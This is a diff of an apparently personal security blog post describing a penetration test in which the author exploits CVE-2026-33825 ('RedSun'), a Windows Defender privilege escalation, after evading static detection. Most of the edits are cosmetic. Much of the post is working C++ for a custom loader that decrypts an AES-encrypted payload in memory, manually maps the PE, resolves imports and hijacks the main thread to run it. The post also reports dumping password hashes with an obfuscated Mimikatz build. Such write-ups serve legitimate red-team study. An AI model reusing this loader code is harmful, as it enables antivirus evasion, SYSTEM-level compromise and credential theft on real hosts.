@@ -250,24 +250,24 @@ article .container > *:nth-child(3){animation-delay:.1s;}
 <article>
 <div class="container">
 
-<h2>Context — What is RedSun?</h2>
+<h2>Context: What is RedSun?</h2>
 <p>
-  During a penetration test engagement I exploited <strong>CVE-2026-33825</strong>, nicknamed <strong>RedSun</strong> — a Local Privilege Escalation vulnerability in Microsoft Windows Defender's cloud file rollback mechanism. The exploit chain allows a standard authenticated user to escalate directly to <strong>NT AUTHORITY\SYSTEM</strong>.
+  During a penetration test engagement I exploited <strong>CVE-2026-33825</strong>, nicknamed <strong>RedSun</strong> a Local Privilege Escalation vulnerability in Microsoft Windows Defender's cloud file rollback mechanism. The exploit chain allows a standard authenticated user to escalate directly to <strong>NT AUTHORITY\SYSTEM</strong>.
 </p>
-<p>The attack abuses three Windows primitives chained together:</p>
+<p>The attack abuses 3 Windows primitives chained together:</p>
 <ul>
-  <li><strong>Cloud reputation metadata</strong> — Defender triggers a file rollback when it sees a cloud-tagged file.</li>
-  <li><strong>NTFS junction + opportunistic lock abuse</strong> — the attacker controls where Defender writes during the rollback.</li>
-  <li><strong>Storage Tiers COM hijack</strong> — <code>TieringEngineService.exe</code> is substituted with a malicious payload, redirecting the privileged write into <code>C:\Windows\System32</code>.</li>
+  <li><strong>Cloud reputation metadata</strong> : Defender triggers a file rollback when it sees a cloud-tagged file.</li>
+  <li><strong>NTFS junction + opportunistic lock abuse</strong> : the attacker controls where Defender writes during the rollback.</li>
+  <li><strong>Storage Tiers COM hijack</strong> : <code>TieringEngineService.exe</code> is substituted with a malicious payload, redirecting the privileged write into <code>C:\Windows\System32</code>.</li>
 </ul>
 <p>
-  Because Defender runs with SYSTEM privileges, the overwritten binary is executed in a fully elevated context — granting a SYSTEM shell from a low-privileged account.
+  Because Defender runs with SYSTEM privileges, the overwritten binary is executed in a fully elevated context, granting a SYSTEM shell from a low-privileged account.
 </p>
 <div class="callout warn">
-  <strong>The problem:</strong> dropping the raw RedSun.exe on disk is immediately flagged and quarantined by Windows Defender — the very process the exploit is intended to abuse. The binary must never hit disk in plaintext.
+  <strong>The problem:</strong> dropping the raw RedSun.exe on disk is immediately flagged and quarantined by Windows Defender. The binary must never hit disk in plaintext.
 </div>
 
-<h2>The Problem — Static PE Detection</h2>
+<h2>The Problem : Static PE Detection</h2>
 <p>
   Static detection operates on the <em>on-disk representation</em> of a PE file. When a known-malicious executable is written:
 </p>
@@ -277,19 +277,17 @@ article .container > *:nth-child(3){animation-delay:.1s;}
   <li>The file is quarantined or deleted before execution ever starts.</li>
 </ul>
 <p>
-  No amount of runtime behaviour matters — if the bytes on disk are recognisable, the game is over before it starts. The solution is to ensure <strong>no cleartext PE ever touches the filesystem</strong>.
+  No amount of runtime behaviour matters, if the bytes on disk are recognisable, the game is over before it starts. The solution is to ensure <strong>no cleartext PE ever touches the filesystem</strong>.
 </p>
 
-<h2>The Solution — AES Encryption + Local Hollowing</h2>
+<h2>AES Encryption and Local Hollowing</h2>
 <p>
-  <strong>Local Process Hollowing</strong> (self-injection hollowing) replaces the current process's execution context in memory with a secondary payload, entirely without writing a decrypted binary to disk. Combined with AES encryption of the embedded payload, the loader binary contains only ciphertext — zero recognisable signatures.
+  <strong>Local Process Hollowing</strong> (self-injection hollowing) replaces the current process's execution context in memory with a secondary payload, entirely without writing a decrypted binary to disk. Combined with AES encryption of the embedded payload, the loader binary contains only ciphertext (zero recognisable signatures).
 </p>
 
-<!-- ═══════════════════════════════════════════════════════════ -->
-<!-- DIAGRAM 1 — ATTACK OVERVIEW                                -->
-<!-- ═══════════════════════════════════════════════════════════ -->
+<!-- DIAGRAM 1 : ATTACK OVERVIEW -->
 <div class="diagram">
-  <div class="diagram-title">Diagram 1 — Full Attack Overview: From Disk to SYSTEM Shell</div>
+  <div class="diagram-title">Diagram 1 : Full Attack Overview: From Disk to SYSTEM Shell</div>
   <svg viewBox="0 0 820 540" xmlns="http://www.w3.org/2000/svg" style="height:auto;">
     <defs>
       <marker id="ar" markerWidth="9" markerHeight="7" refX="8" refY="3.5" orient="auto"><polygon points="0 0,9 3.5,0 7" fill="#e83030"/></marker>
@@ -313,7 +311,7 @@ article .container > *:nth-child(3){animation-delay:.1s;}
     <line x1="70" y1="416" x2="810" y2="416" stroke="#1a2535" stroke-width="1" stroke-dasharray="4,4"/>
     <line x1="70" y1="516" x2="810" y2="516" stroke="#1a2535" stroke-width="1" stroke-dasharray="4,4"/>
 
-    <!-- ── PHASE 1: LOAD ── -->
+    <!-- PHASE 1: LOAD -->
     <!-- HarryPotter.exe box -->
     <rect x="270" y="62" width="280" height="52" rx="2" fill="#111820" stroke="#e83030" stroke-width="1.5"/>
     <rect x="270" y="62" width="280" height="12" rx="2" fill="rgba(232,48,48,.18)"/>
@@ -324,7 +322,7 @@ article .container > *:nth-child(3){animation-delay:.1s;}
     <!-- Arrow down -->
     <line x1="410" y1="114" x2="410" y2="138" stroke="#e83030" stroke-width="1.5" marker-end="url(#ar)"/>
 
-    <!-- ── PHASE 2: HOLLOWING ── -->
+    <!-- PHASE 2: HOLLOWING -->
     <!-- main() box -->
     <rect x="310" y="140" width="200" height="44" rx="2" fill="#111820" stroke="#58a6ff" stroke-width="1"/>
     <text x="410" y="157" fill="#58a6ff" font-family="'Bebas Neue',sans-serif" font-size="13" letter-spacing="2" text-anchor="middle">main ( )</text>
@@ -387,7 +385,7 @@ article .container > *:nth-child(3){animation-delay:.1s;}
     <line x1="195" y1="468" x2="195" y2="488" stroke="#3fb950" stroke-width="1.5"/>
     <line x1="195" y1="488" x2="395" y2="488" stroke="#3fb950" stroke-width="1.5" marker-end="url(#ag)"/>
 
-    <!-- ── PHASE 3: EXPLOIT ── (handled by RedSun itself, just label it) -->
+    <!-- PHASE 3: EXPLOIT -->
     <!-- EICAR bait -->
     <rect x="270" y="422" width="115" height="36" rx="2" fill="#111820" stroke="#e83030" stroke-width="1" opacity="0"/><!-- spacer -->
 
@@ -408,21 +406,21 @@ article .container > *:nth-child(3){animation-delay:.1s;}
 
 <h2>Implementation</h2>
 
-<h3>Entry Point — main()</h3>
+<h3>Entry Point : main()</h3>
 <p>
   The loader's <code>main</code> is deliberately thin. Its only job is to acquire a <strong>real, transferable handle</strong> to the main thread and hand it to <code>Doit</code>.
 </p>
 <blockquote>
-  <strong>Why duplicate?</strong> <code>GetCurrentThread()</code> returns a pseudo-handle — a constant meaningful only within the calling thread. To <code>SuspendThread</code> and <code>SetThreadContext</code> on the main thread <em>from a different thread</em>, we need a real kernel handle. <code>DuplicateHandle</code> with <code>DUPLICATE_SAME_ACCESS</code> produces one.
+  <strong>Why duplicate?</strong> <code>GetCurrentThread()</code> returns a pseudo-handle which is a constant meaningful only within the calling thread. To <code>SuspendThread</code> and <code>SetThreadContext</code> on the main thread <em>from a different thread</em>, we need a real kernel handle. <code>DuplicateHandle</code> with <code>DUPLICATE_SAME_ACCESS</code> produces one.
 </blockquote>
 
 <pre data-lang="cpp"><code class="language-cpp">int main() {
 
-    // GetCurrentThread() returns a pseudo-handle — valid only for the calling thread.
+    // GetCurrentThread() returns a pseudo-handle wich is valid only for the calling thread.
     HANDLE pseudoHandle = GetCurrentThread();
     HANDLE realHandle;
 
-    // Produce a real, transferable handle with identical access rights.
+    // Transferable handle with identical access rights.
     if (!DuplicateHandle(
             GetCurrentProcess(), pseudoHandle,
             GetCurrentProcess(), &realHandle,
@@ -443,11 +441,9 @@ article .container > *:nth-child(3){animation-delay:.1s;}
     return 0;
 }</code></pre>
 
-<!-- ═══════════════════════════════════════════════════════════ -->
-<!-- DIAGRAM 2 — THREAD TIMELINE                                -->
-<!-- ═══════════════════════════════════════════════════════════ -->
+<!-- DIAGRAM 2 — THREAD TIMELINE -->
 <div class="diagram">
-  <div class="diagram-title">Diagram 2 — Thread Execution Timeline (Swim Lanes)</div>
+  <div class="diagram-title">Diagram 2 : Thread Execution Timeline</div>
   <svg viewBox="0 0 820 310" xmlns="http://www.w3.org/2000/svg" style="height:auto;">
     <defs>
       <marker id="ar2" markerWidth="9" markerHeight="7" refX="8" refY="3.5" orient="auto"><polygon points="0 0,9 3.5,0 7" fill="#e83030"/></marker>
@@ -479,7 +475,7 @@ article .container > *:nth-child(3){animation-delay:.1s;}
     <line x1="570" y1="287" x2="570" y2="293" stroke="#1a2535" stroke-width="1"/>
     <line x1="720" y1="287" x2="720" y2="293" stroke="#1a2535" stroke-width="1"/>
 
-    <!-- ── MAIN THREAD TIMELINE ── -->
+    <!-- MAIN THREAD TIMELINE -->
     <!-- Active bar: t=0 to t=1 (running, spawning Doit) -->
     <rect x="140" y="60" width="130" height="22" rx="2" fill="rgba(88,166,255,.25)" stroke="#58a6ff" stroke-width="1"/>
     <text x="205" y="75" fill="#58a6ff" font-family="monospace" font-size="8" text-anchor="middle">Running: main()</text>
@@ -501,7 +497,7 @@ article .container > *:nth-child(3){animation-delay:.1s;}
     <rect x="570" y="60" width="150" height="22" rx="2" fill="rgba(63,185,80,.25)" stroke="#3fb950" stroke-width="1.5"/>
     <text x="645" y="75" fill="#3fb950" font-family="monospace" font-size="8" text-anchor="middle">▶ RedSun EP runs</text>
 
-    <!-- ── DOIT THREAD TIMELINE ── -->
+    <!-- DOIT THREAD TIMELINE -->
     <!-- Spawned at t=1 -->
     <rect x="270" y="185" width="60" height="22" rx="2" fill="rgba(232,48,48,.2)" stroke="#e83030" stroke-width="1"/>
     <text x="300" y="200" fill="#e83030" font-family="monospace" font-size="8" text-anchor="middle">Spawn</text>
@@ -539,7 +535,7 @@ article .container > *:nth-child(3){animation-delay:.1s;}
   </svg>
 </div>
 
-<h3>Step 1 — Suspend the Main Thread</h3>
+<h3>Step 1 : Suspend the Main Thread</h3>
 <p>
   The first action of <code>Doit</code> is to halt the main thread so no further instructions execute while mapping is in progress.
 </p>
@@ -549,9 +545,9 @@ HANDLE mainThreadHandle = *(HANDLE*)lpParam;
 SuspendThread(mainThreadHandle);
 printf("[+] mainThread suspended\n");</code></pre>
 
-<h3>Step 2 — AES Decrypt the Payload</h3>
+<h3>Step 2 : AES Decrypt the Payload</h3>
 <p>
-  The RedSun PE is stored as an AES-256-CBC encrypted byte array embedded in the loader. Decryption happens entirely in heap memory — nothing is written to disk.
+  The RedSun PE is stored as an AES-256 encrypted byte array embedded in the loader. Decryption happens entirely in heap memory, nothing is written to disk.
 </p>
 <pre data-lang="cpp"><code class="language-cpp">// Embedded ciphertext blob (compiled into the binary as a byte array)
 extern const unsigned char encPayload[];
@@ -564,18 +560,16 @@ BYTE* decBuf = NULL;
 size_t decLen = 0;
 
 AES_CBC_Decrypt(encPayload, encPayloadLen, aesKey, aesIV, &decBuf, &decLen);
-printf("[+] mimi decrypted\n");</code></pre>
+printf("[+] Decrypted\n");</code></pre>
 
-<h3>Steps 3–6 — Manual PE Mapping</h3>
+<h3>Steps 3–6 : Manual PE Mapping</h3>
 <p>
   <code>decBuf</code> now holds a valid PE image in heap memory. We manually map it at a freshly allocated virtual address.
 </p>
 
-<!-- ═══════════════════════════════════════════════════════════ -->
-<!-- DIAGRAM 3 — PE MAPPING                                     -->
-<!-- ═══════════════════════════════════════════════════════════ -->
+<!-- DIAGRAM 3 : PE MAPPING -->
 <div class="diagram">
-  <div class="diagram-title">Diagram 3 — Manual PE Mapping: Raw Bytes → Mapped Image in Memory</div>
+  <div class="diagram-title">Diagram 3 : Manual PE Mapping: Raw Bytes → Mapped Image in Memory</div>
   <svg viewBox="0 0 820 420" xmlns="http://www.w3.org/2000/svg" style="height:auto;">
     <defs>
       <marker id="ar3" markerWidth="9" markerHeight="7" refX="8" refY="3.5" orient="auto"><polygon points="0 0,9 3.5,0 7" fill="#e83030"/></marker>
@@ -592,7 +586,7 @@ printf("[+] mimi decrypted\n");</code></pre>
     <line x1="275" y1="35" x2="275" y2="400" stroke="#1a2535" stroke-width="1" stroke-dasharray="3,4"/>
     <line x1="540" y1="35" x2="540" y2="400" stroke="#1a2535" stroke-width="1" stroke-dasharray="3,4"/>
 
-    <!-- ── LEFT COLUMN: raw PE layout ── -->
+    <!-- LEFT COLUMN: raw PE layout -->
     <!-- File offset 0 -->
     <rect x="50" y="40" width="210" height="30" rx="1" fill="#111820" stroke="#1a2535" stroke-width="1"/>
     <text x="155" y="60" fill="#b8c2cc" font-family="monospace" font-size="9" text-anchor="middle">DOS Header (MZ magic)</text>
@@ -622,7 +616,7 @@ printf("[+] mimi decrypted\n");</code></pre>
     <text x="155" y="340" fill="#5a6577" font-family="monospace" font-size="8" text-anchor="middle">② Iterate IMAGE_SECTION_HEADER[]</text>
     <text x="155" y="352" fill="#5a6577" font-family="monospace" font-size="8" text-anchor="middle">for each section → copy raw data</text>
 
-    <!-- ── MIDDLE COLUMN: parsing labels ── -->
+    <!-- MIDDLE COLUMN: parsing labels -->
     <text x="415" y="56" fill="#5a6577" font-family="monospace" font-size="8" text-anchor="middle">e_magic = 0x5A4D (MZ)</text>
     <text x="415" y="68" fill="#5a6577" font-family="monospace" font-size="8" text-anchor="middle">e_lfanew → NT headers offset</text>
 
@@ -642,7 +636,7 @@ printf("[+] mimi decrypted\n");</code></pre>
     <text x="408" y="134" fill="#5a6577" font-family="monospace" font-size="7.5" text-anchor="middle">memcpy( imageBase+VA, raw+RVA )</text>
     <text x="408" y="144" fill="#5a6577" font-family="monospace" font-size="7.5" text-anchor="middle">for each section</text>
 
-    <!-- ── RIGHT COLUMN: mapped image ── -->
+    <!-- RIGHT COLUMN: mapped image -->
     <!-- VirtualAlloc -->
     <rect x="555" y="40" width="220" height="30" rx="1" fill="rgba(63,185,80,.1)" stroke="#3fb950" stroke-width="1.5"/>
     <text x="665" y="55" fill="#3fb950" font-family="monospace" font-size="8.5" text-anchor="middle">VirtualAlloc (SizeOfImage)</text>
@@ -692,7 +686,7 @@ printf("[+] PE data : 0x%016llX\n", (ULONG_PTR)decBuf);
 
 // Allocate virtual memory for the mapped image
 LPVOID imageBase = VirtualAlloc(
-    (LPVOID)nt->OptionalHeader.ImageBase,   // preferred base
+    (LPVOID)nt->OptionalHeader.ImageBase,
     nt->OptionalHeader.SizeOfImage,
     MEM_COMMIT | MEM_RESERVE,
     PAGE_EXECUTE_READWRITE
@@ -702,10 +696,10 @@ if (!imageBase)
     imageBase = VirtualAlloc(NULL, nt->OptionalHeader.SizeOfImage,
                              MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
-// ── Map headers ──
+// Map headers
 memcpy(imageBase, decBuf, nt->OptionalHeader.SizeOfHeaders);
 
-// ── Map sections ──
+// Map sections
 PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
 for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
     LPVOID dst = (LPVOID)((ULONG_PTR)imageBase + sec->VirtualAddress);
@@ -713,7 +707,7 @@ for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
     memcpy(dst, src, sec->SizeOfRawData);
 }
 
-// ── Apply base relocations ──
+// Apply base relocations
 ULONG_PTR delta = (ULONG_PTR)imageBase - nt->OptionalHeader.ImageBase;
 if (delta != 0) {
     PIMAGE_DATA_DIRECTORY relDir =
@@ -735,7 +729,7 @@ if (delta != 0) {
     }
 }
 
-// ── Resolve imports (IAT) ──
+// Resolve IAT
 PIMAGE_DATA_DIRECTORY impDir =
     &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
 PIMAGE_IMPORT_DESCRIPTOR imp =
@@ -761,16 +755,14 @@ while (imp->Name) {
     imp++;
 }</code></pre>
 
-<h3>Step 7 — Redirect Entry Point &amp; Resume</h3>
+<h3>Step 7 : Redirect Entry Point &amp; Resume</h3>
 <p>
   With the image fully mapped and imports resolved, we redirect the suspended main thread's instruction pointer to the payload's entry point, then resume it.
 </p>
 
-<!-- ═══════════════════════════════════════════════════════════ -->
-<!-- DIAGRAM 4 — IAT RESOLUTION                                 -->
-<!-- ═══════════════════════════════════════════════════════════ -->
+<!-- DIAGRAM 4 : IAT RESOLUTION -->
 <div class="diagram">
-  <div class="diagram-title">Diagram 4 — Import Address Table Resolution &amp; Thread Context Redirect</div>
+  <div class="diagram-title">Diagram 4 : Import Address Table Resolution &amp; Thread Context Redirect</div>
   <svg viewBox="0 0 820 360" xmlns="http://www.w3.org/2000/svg" style="height:auto;">
     <defs>
       <marker id="ar4" markerWidth="9" markerHeight="7" refX="8" refY="3.5" orient="auto"><polygon points="0 0,9 3.5,0 7" fill="#e83030"/></marker>
@@ -780,7 +772,7 @@ while (imp->Name) {
     </defs>
     <rect width="820" height="360" fill="#0d1117"/>
 
-    <!-- ── IAT section (left half) ── -->
+    <!--  IAT section (left half) -->
     <text x="200" y="24" fill="#e8873a" font-family="'Bebas Neue',sans-serif" font-size="12" text-anchor="middle" letter-spacing="2">IAT — BEFORE (unresolved)</text>
     <text x="620" y="24" fill="#3fb950" font-family="'Bebas Neue',sans-serif" font-size="12" text-anchor="middle" letter-spacing="2">IAT — AFTER (resolved)</text>
     <line x1="410" y1="30" x2="410" y2="220" stroke="#1a2535" stroke-width="1" stroke-dasharray="3,4"/>
@@ -837,7 +829,7 @@ while (imp->Name) {
     <!-- Arrow between halves -->
     <line x1="370" y1="90" x2="445" y2="90" stroke="#3fb950" stroke-width="2" stroke-dasharray="5,3" marker-end="url(#ag4)"/>
 
-    <!-- ── SetThreadContext section (bottom) ── -->
+    <!-- SetThreadContext section (bottom) -->
     <line x1="50" y1="228" x2="770" y2="228" stroke="#1a2535" stroke-width="1"/>
     <text x="410" y="248" fill="#e3b341" font-family="'Bebas Neue',sans-serif" font-size="13" text-anchor="middle" letter-spacing="3">THREAD CONTEXT REDIRECT</text>
 
@@ -878,11 +870,8 @@ ctx.Rip = ep;   // instruction pointer
 
 SetThreadContext(mainThreadHandle, &ctx);
 
-// Resume — main thread now executes RedSun entry point
-ResumeThread(mainThreadHandle);
-printf("[+] Delay time ...\n");
-printf("The sun is shinning...\n");
-printf("The red sun shall prevail.\n");</code></pre>
+// Resume main thread now executes RedSun entry point
+ResumeThread(mainThreadHandle);</code></pre>
 
 <hr>
 
@@ -892,13 +881,13 @@ printf("The red sun shall prevail.\n");</code></pre>
     <tr><th>#</th><th>Function</th><th>Purpose</th></tr>
   </thead>
   <tbody>
-    <tr><td class="n">1</td><td class="fn">DuplicateHandle()</td><td class="desc">Convert pseudo-handle → real transferable handle to main thread</td></tr>
+    <tr><td class="n">1</td><td class="fn">DuplicateHandle()</td><td class="desc">Convert pseudo-handle => real transferable handle to main thread</td></tr>
     <tr><td class="n">2</td><td class="fn">CreateThread(Doit)</td><td class="desc">Spawn hollowing worker; main thread calls WaitForSingleObject</td></tr>
     <tr><td class="n">3</td><td class="fn">SuspendThread()</td><td class="desc">Halt main thread; no instructions execute during mapping</td></tr>
-    <tr><td class="n">4</td><td class="fn">AES_CBC_Decrypt()</td><td class="desc">Decrypt embedded ciphertext → valid PE image, heap only</td></tr>
+    <tr><td class="n">4</td><td class="fn">AES_CBC_Decrypt()</td><td class="desc">Decrypt embedded ciphertext => valid PE image, heap only</td></tr>
     <tr><td class="n">5</td><td class="fn">VirtualAlloc()</td><td class="desc">Allocate RWX region sized by <code>SizeOfImage</code></td></tr>
     <tr><td class="n">6</td><td class="fn">memcpy() × N</td><td class="desc">Map PE headers + each section at their respective Virtual Addresses</td></tr>
-    <tr><td class="n">7</td><td class="fn">Relocation loop</td><td class="desc">Patch all absolute addresses by <code>delta = actual − preferred</code></td></tr>
+    <tr><td class="n">7</td><td class="fn">Relocation loop</td><td class="desc">Patch all absolute addresses by <code>delta = actual - preferred</code></td></tr>
     <tr><td class="n">8</td><td class="fn">LoadLibrary / GetProcAddress</td><td class="desc">Resolve every imported function; write real addresses into IAT</td></tr>
     <tr><td class="n">9</td><td class="fn">SetThreadContext()</td><td class="desc">Overwrite <code>RIP</code> with <code>imageBase + AddressOfEntryPoint</code></td></tr>
     <tr><td class="n">10</td><td class="fn">ResumeThread()</td><td class="desc">Main thread resumes; executes RedSun EP as the loader's identity</td></tr>
@@ -907,27 +896,27 @@ printf("The red sun shall prevail.\n");</code></pre>
 
 <h2>Result</h2>
 <p>
-  The loader (<strong>HarryPotter.exe</strong>) was delivered to the target host. On execution:
+  The loader (<strong>HarryPotter.exe</strong>) was delivered to the target host. On execution :
 </p>
 <ul>
-  <li>The AES-encrypted payload was decrypted in heap memory — no cleartext PE ever written to disk.</li>
+  <li>The AES-encrypted payload was decrypted in heap memory (no cleartext PE ever written to disk).</li>
   <li>Windows Defender detected the <strong>EICAR test file</strong> used as bait, triggering the cloud rollback mechanism as the exploit intends.</li>
   <li>A new <code>conhost.exe</code> shell was spawned as <strong>NT AUTHORITY\SYSTEM (S-1-5-18)</strong>.</li>
   <li>Local password hashes were extracted from the SYSTEM shell using an obfuscated Mimikatz build, confirming full host compromise.</li>
 </ul>
 
 <div class="diagram-custom">
-  <div class="diagram-title">Diagram 5 — Result (PoC) </div>
+  <div class="diagram-title">Diagram 5 : Result (PoC) </div>
   <img width="1609" height="803" alt="image" src="https://rfc6592.github.io/assets/img/LocalHollowing-RedSun.png" />
 </div>
   
 <h2>Key Takeaways</h2>
 <ul>
   <li><strong>Static detection</strong> is signature-driven against the on-disk PE representation. AES ciphertext has no matchable pattern.</li>
-  <li><strong>Local Hollowing</strong> keeps the decrypted payload entirely in memory — no temp files, no disk writes of the plaintext PE.</li>
+  <li><strong>Local Hollowing</strong> keeps the decrypted payload entirely in memory (no temp files, no disk writes of the plaintext PE).</li>
   <li><strong>Manual PE mapping</strong> is foundational: DOS/NT headers, section table, relocation directory, and IAT are the four structures you must fully understand.</li>
-  <li>The <code>DuplicateHandle → SuspendThread → SetThreadContext → ResumeThread</code> pattern is a clean in-process redirect that avoids spawning any detectable child process.</li>
-  <li>The technique works precisely because Defender's own remediation write is the privilege vector — the loader simply needs to survive long enough to trigger it.</li>
+  <li>The <code>DuplicateHandle => SuspendThread => SetThreadContext => ResumeThread</code> pattern is a clean in-process redirect that avoids spawning any detectable child process.</li>
+  <li>The technique works precisely because Defender's own remediation write is the privilege vector (the loader simply needs to survive long enough to trigger it.)</li>
 </ul>
 
 <div class="refs">
@@ -935,7 +924,7 @@ printf("The red sun shall prevail.\n");</code></pre>
   <ul>
     <li><a href="https://github.com/Nightmare-Eclipse/RedSun" target="_blank">RedSun PoC — github.com/Nightmare-Eclipse/RedSun</a></li>
     <li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-33825" target="_blank">MSRC — CVE-2026-33825</a></li>
-    <li>Picus Security — BlueHammer &amp; RedSun Explained</li>
+    <li>Picus Security : BlueHammer &amp; RedSun Explained</li>
     <li><a href="https://attack.mitre.org/techniques/T1055/" target="_blank">MITRE ATT&amp;CK — T1055: Process Injection</a></li>
     <li><a href="https://attack.mitre.org/techniques/T1574/" target="_blank">MITRE ATT&amp;CK — T1574: Hijack Execution Flow</a></li>
     <li><a href="https://attack.mitre.org/techniques/T1548/" target="_blank">MITRE ATT&amp;CK — T1548: Abuse Elevation Control Mechanism</a></li>
